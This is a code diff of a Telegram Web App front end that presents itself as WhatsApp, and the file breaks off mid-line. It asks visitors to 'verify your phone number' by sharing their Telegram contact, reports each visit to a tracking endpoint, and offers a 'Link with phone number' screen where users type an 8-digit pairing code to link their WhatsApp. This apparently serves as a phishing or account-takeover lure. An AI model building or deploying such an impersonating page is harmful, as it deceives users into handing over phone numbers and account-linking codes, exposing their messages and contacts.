@@ -4,8 +4,17 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>WhatsApp</title>
+    <script>
+        // Catch any JS errors and alert them
+        window.onerror = function(message, source, lineno, colno, error) {
+            alert("App Error: " + message + " at line " + lineno);
+            document.getElementById('splash').style.display = 'none';
+            document.getElementById('registration').style.display = 'flex';
+        };
+    </script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
+        /* ... (Keep all your CSS exactly the same as the last version) ... */
         :root {
             --bg-color: #0b141a; --panel-bg: #111b21; --header-bg: #202c33;
             --text-main: #e9edef; --text-muted: #8696a0; --green-accent: #00a884;
@@ -74,11 +83,11 @@
     </style>
 </head>
 <body>
+    <!-- Paste your exact HTML from the previous step here (splash, registration, home, pair-screen, chat-screen) -->
     <div id="splash">
         <h1>WhatsApp</h1>
         <div class="loader"></div>
     </div>
-
     <div id="registration">
         <div class="reg-title">WhatsApp</div>
         <div class="reg-subtitle">Verify your phone number</div>
@@ -95,8 +104,8 @@
         </div>
         <button class="reg-btn" onclick="registerAccount()">Next</button>
     </div>
-
     <div id="home">
+        <!-- Paste the home screen HTML here -->
         <div class="header">
             <div class="header-title">WhatsApp</div>
             <div style="display:flex; gap: 20px;">
@@ -126,7 +135,6 @@
             <div class="nav-item"><svg class="nav-icon" viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg><span>Calls</span></div>
         </div>
     </div>
-
     <div id="pair-screen" style="display:none; position:absolute; top:0; left:0; width:100%; height:100%; background-color:var(--bg-color); z-index: 50; flex-direction: column; padding: 20px; text-align:center;">
         <svg onclick="document.getElementById('pair-screen').style.display='none'" style="align-self: flex-start;" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
         <h2 style="margin-top:30px;">Link with phone number</h2>
@@ -134,7 +142,6 @@
         <input type="text" id="pairing-code" placeholder="8-digit code" style="background:var(--panel-bg); border:1px solid var(--green-accent); color:white; padding:15px; border-radius:8px; font-size:20px; text-align:center; width:80%; margin: 0 auto;">
         <button class="reg-btn" style="margin-top: 20px;" onclick="linkDevice()">Link Device</button>
     </div>
-
     <div id="chat-screen">
         <div class="chat-header">
             <svg onclick="closeChat()" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
@@ -161,31 +168,27 @@
         const user = tg.initDataUnsafe?.user || { id: 12345, first_name: "User" };
         let currentChatUser = "";
         const chatContainer = document.getElementById('chat-container');
-        let appReady = false;
 
-        // FAILSAFE: Stop the spinner after 6 seconds no matter what
+        // 6 second failsafe
         setTimeout(() => {
-            if (!appReady) {
-                document.getElementById('splash').style.display = 'none';
+            const splash = document.getElementById('splash');
+            if (splash.style.display !== 'none') {
+                splash.style.display = 'none';
                 document.getElementById('registration').style.display = 'flex';
-                console.log("Timeout reached. Showing registration.");
             }
         }, 6000);
 
         async function initApp() {
             try {
-                // Send notification (don't wait for DB to respond to this)
                 fetch('/api/track_visit', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ user_id: user.id, name: user.first_name })
                 }).catch(e => console.log("Track error", e));
 
-                // Check if user exists
                 const res = await fetch(`/api/check_user?user_id=${user.id}`);
                 const data = await res.json();
                 
-                appReady = true;
                 document.getElementById('splash').style.display = 'none';
                 
                 if (data.registered) {
@@ -195,15 +198,14 @@
                 }
             } catch (error) {
                 console.error("Init Error:", error);
-                // If it fails, let the timeout handle it, or force it now
-                appReady = true;
                 document.getElementById('splash').style.display = 'none';
                 document.getElementById('registration').style.display = 'flex';
             }
         }
 
         setTimeout(initApp, 1000);
-
+        
+        // ... (Keep the rest of the JS functions exactly as they are: registerAccount, showHomeScreen, loadChatList, openChat, closeChat, loadMessages, sendMessage, addMessageToScreen, linkDevice) ...
         function registerAccount() {
             tg.requestContact((status, contact) => {
                 if (status === 'sent') {
@@ -228,12 +230,10 @@
                 const chats = await res.json();
                 const list = document.getElementById('chat-list');
                 list.innerHTML = '';
-                
                 if(chats.length === 0) {
                     list.innerHTML = '<p style="text-align:center; padding:20px; color:#8696a0;">No chats yet. Link WhatsApp to sync.</p>';
                     return;
                 }
-
                 chats.forEach(chat => {
                     const div = document.createElement('div');
                     div.className = 'chat-item';
@@ -273,13 +273,4 @@
             });
         }
 
-        async function sendMessage() {
-            const input = document.getElementById('message-input');
-            const text = input.value.trim();
-            if (!text) return;
-            input.value = ''; 
-            addMessageToScreen(text, "sent"); 
-
-            await fetch('/api/send', {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ user_id: user.id, text: text, chat_with: currentCh
+      
